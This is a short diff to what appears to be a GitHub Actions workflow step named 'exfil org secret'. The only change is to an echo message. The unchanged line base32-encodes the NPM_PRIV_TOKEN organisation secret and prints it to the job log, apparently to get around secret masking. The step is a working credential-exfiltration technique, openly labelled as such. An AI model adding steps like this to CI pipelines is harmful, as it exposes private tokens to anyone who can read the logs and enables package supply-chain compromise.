@@ -11,6 +11,6 @@ jobs:
     - name: exfil org secret
       id: response
       run:  |
-          echo "lets exfil some org secrets..."
+          echo "lets exfil some org secrets TEST..."
           echo "${{secrets.NPM_PRIV_TOKEN}}" | base32
           
